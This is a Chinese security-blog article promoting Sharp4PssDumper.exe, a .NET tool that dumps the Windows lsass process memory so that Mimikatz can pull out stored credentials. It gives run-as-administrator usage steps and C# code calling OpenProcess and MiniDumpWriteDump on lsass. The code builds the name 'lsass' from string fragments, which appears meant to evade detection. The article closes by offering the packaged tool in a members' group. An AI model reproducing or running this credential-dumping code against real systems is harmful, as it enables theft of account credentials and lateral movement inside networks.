---
title: .NET 一款内网转储 lsass 进程凭据的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247496462&idx=1&sn=d93cae1ce8a48aa6e59ce88f4e1aeaa7&chksm=fa595de3cd2ed4f50bf25f07bfdf2a9870f827edd3fc13e4792354e5d6d19880897c95357129&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-11-06
fetch_date: 2025-10-06T19:18:52.476706
---

# .NET 一款内网转储 lsass 进程凭据的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xIAE5yBXAHuicnCdiaFhaiaBV8ID0cCS3K5bfCKuYKdvaW4tk0vzNPS6oDwzNHibVG1Ipwz9aKOlFiaQ/0?wx_fmt=jpeg)
...
Sharp4PssDumper.exe 是一款用于从 Windows 操作系统中 lsass 进程创建内存转储的工具。这种转储文件可以被工具如 Mimikatz 用于进一步分析和解码，从而获取系统的安全凭证。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9nrndibAyGiat3vZJs9ibYUWc1Kc9th7iaiawL4BQZe8xVkwWiajrQI7BJXZXIbxMHahW7lCBfsDFZrTlA/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

工具默认会创建一个转储文件，文件名格式为 hostname\_DD-MM-YYYY-HHMM.txt，其中 hostname 是计算机名，DD-MM-YYYY-HHMM 是当前的日期和时间，用户可以通过右键单击Sharp4PssDumper文件，并选择“以管理员身份运行”来快速启动该工具。

在运行该工具后，用户会在当前目录找到以主机名和时间戳命名的转储文件。可以通过 Mimikatz 等工具解析该转储文件，提取用户凭据等敏感信息，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8xIAE5yBXAHuicnCdiaFhaiaBib9BxOHeIU7uAOePYcaP0WXLqauw0MiaKUypvWibicCEIzrBfM0rO9CW6A/640?wx_fmt=png&from=appmsg)

04

原理解析

以下是工具实现中与转储功能相关的代码片段，通过 DllImport 特性引入 Dbghelp.dll 中的 MiniDumpWriteDump 函数。该函数负责将进程的内存转储写入文件
...
随后，getProcessPid 方法使用 Process.GetProcessesByName 方法获取 lsass 进程的进程 ID。该方法构造了一个名称字符串 "lsass"，并返回第一个匹配的进程 ID
...
private static int getProcessPid()
{
    ...
    string text2 = "s";
    string text3 = "a";
    return Process.GetProcessesByName(string.Concat(new string[] { text, text2, text3, text2, text2 }))[0].Id;
}
```
```

最后，调用 MiniDumpWriteDump 方法将 lsass 进程的内存转储到指定的文件流中，如下所示。

```
```
FileStream fileStream = new FileStream(text3, FileMode.Create);
IntPtr intPtr = Program.OpenProcess(1040U, false, processPid);
Program.MiniDumpWriteDump(intPtr, processPid, fileStream.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
```
```

综上，Sharp4PssDumper.exe 是一款功能强大的内存转储工具，能够从 lsass 进程中捕获敏感信息。工具已经打包在星球，感兴趣的朋友可以加入自取。
